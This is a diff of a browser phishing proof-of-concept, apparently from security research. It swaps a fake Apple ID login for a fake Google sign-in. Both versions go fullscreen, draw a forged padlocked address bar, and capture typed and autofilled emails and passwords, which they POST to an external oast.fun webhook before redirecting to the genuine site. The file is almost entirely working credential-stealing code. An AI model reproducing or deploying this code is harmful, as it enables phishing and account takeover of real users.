@@ -1,9 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>Safari Phishing Interstitial Bypass</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Google Login Spoof</title>
   <style>
     html, body {
       margin: 0;
@@ -13,141 +12,124 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      font-family: -apple-system, sans-serif;
     }
 
-    #launch {
-      background: #1a73e8;
+    button {
+      background: #4285f4;
       color: white;
       font-size: 18px;
       padding: 1em 2em;
-      border-radius: 8px;
+      border-radius: 6px;
       border: none;
       cursor: pointer;
     }
   </style>
 </head>
 <body>
-  <button id="launch">Login with Apple</button>
+  <button onclick="spoof()">Click to spoof Google</button>
 
   <script>
     const webhook = "https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun";
 
-    document.getElementById('launch').onclick = async () => {
-      try {
-        await document.documentElement.requestFullscreen();
+    async function spoof() {
+      await document.documentElement.requestFullscreen();
 
-        if (!document.fullscreenElement) {
-          alert("Fullscreen failed. Exploit aborted.");
-          return;
-        }
+      const win = window.open('', '_blank');
+      setTimeout(() => {
+        win.document.open();
+        win.document.write(`
+          <style>
+            body {
+              margin: 0;
+              background: #fff;
+              font-family: -apple-system, sans-serif;
+            }
+            .bar {
+              position: fixed;
+              top: 0;
+              left: 0;
+              height: 38px;
+              width: 100%;
+              background: #f1f3f4;
+              border-bottom: 1px solid #ccc;
+              padding: 8px 12px;
+              font-size: 13px;
+              color: #202124;
+              font-weight: 500;
+            }
+            .bar::before {
+              content: "🔒 https://www.google.com";
+            }
+            .content {
+              margin-top: 60px;
+              text-align: center;
+              padding: 20px;
+            }
+            input {
+              display: block;
+              margin: 10px auto;
+              padding: 10px;
+              font-size: 16px;
+              width: 80%;
+              border: 1px solid #ccc;
+              border-radius: 6px;
+            }
+            button {
+              margin-top: 20px;
+              padding: 10px;
+              font-size: 16px;
+              background: #4285f4;
+              color: white;
+              border: none;
+              border-radius: 6px;
+              cursor: pointer;
+            }
+          </style>
 
-        const win = window.open('', '_blank');
+          <div class="bar"></div>
+          <div class="content">
+            <h2>Sign in with Google</h2>
+            <input id="email" type="email" placeholder="Email" autocomplete="on">
+            <input id="pass" type="password" placeholder="Password" autocomplete="on">
+            <button onclick="exfil()">Next</button>
+          </div>
 
-        setTimeout(() => {
-          win.document.open();
-          win.document.write(`
-            <style>
-              html, body {
-                margin: 0;
-                font-family: -apple-system, sans-serif;
-                background: #f2f2f7;
-                width: 100vw;
-                height: 100vh;
-                overflow: hidden;
+          <script>
+            function exfil() {
+              const email = document.getElementById('email').value;
+              const pass = document.getElementById('pass').value;
+
+              fetch('${webhook}', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, pass })
+              });
+
+              alert('Verifying identity...');
+              setTimeout(() => {
+                location.replace("https://accounts.google.com");
+              }, 2000);
+            }
+
+            setInterval(() => {
+              const e = document.getElementById('email');
+              const p = document.getElementById('pass');
+              if (e && p && e.value && p.value) {
+                fetch('${webhook}', {
+                  method: 'POST',
+                  mode: 'no-cors',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ email: e.value, pass: p.value })
+                });
               }
-              .spoof-bar {
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 38px;
-                background: #ffffff;
-                border-bottom: 1px solid #ccc;
-                font-size: 14px;
-                padding-left: 12px;
-                display: flex;
-                align-items: center;
-                font-weight: 500;
-                z-index: 9999;
-              }
-              .spoof-bar::before {
-                content: "🔒 https://appleid.apple.com";
-                color: #333;
-              }
-              .container {
-                padding: 60px 20px 20px;
-              }
-              input {
-                width: 100%;
-                padding: 12px;
-                margin-top: 15px;
-                font-size: 16px;
-                border-radius: 6px;
-                border: 1px solid #ccc;
-              }
-              button {
-                margin-top: 20px;
-                padding: 12px;
-                width: 100%;
-                font-size: 16px;
-                background: #1a73e8;
-                color: white;
-                border: none;
-                border-radius: 8px;
-                cursor: pointer;
-              }
-            </style>
-
-            <div class="spoof-bar"></div>
-            <div class="container">
-              <h2>Sign in with Apple</h2>
-              <input id="email" type="email" placeholder="Apple ID" autocomplete="on">
-              <input id="password" type="password" placeholder="Password" autocomplete="on">
-              <button onclick="send()">Continue</button>
-            </div>
-
-            <script>
-              const send = () => {
-                const email = document.getElementById("email").value;
-                const pass = document.getElementById("password").value;
-
-                if (email && pass) {
-                  fetch("${webhook}", {
-                    method: "POST",
-                    mode: "no-cors",
-                    body: JSON.stringify({ email, pass }),
-                    headers: { "Content-Type": "application/json" }
-                  });
-                }
-
-                alert("Face ID authentication required...");
-                setTimeout(() => {
-                  location.replace("https://appleid.apple.com");
-                }, 2000);
-              };
-
-              // Autofill polling exfiltration
-              setInterval(() => {
-                const e = document.getElementById("email");
-                const p = document.getElementById("password");
-                if (e && p && e.value && p.value) {
-                  fetch("${webhook}", {
-                    method: "POST",
-                    mode: "no-cors",
-                    body: JSON.stringify({ email: e.value, pass: p.value }),
-                    headers: { "Content-Type": "application/json" }
-                  });
-                }
-              }, 300);
-            <\/script>
-          `);
-          win.document.close();
-        }, 150); // ensure window rendering ready
-      } catch (err) {
-        alert("Exploit error: " + err.message);
-      }
-    };
+            }, 500);
+          <\/script>
+        `);
+        win.document.close();
+      }, 150);
+    }
   </script>
 </body>
 </html>
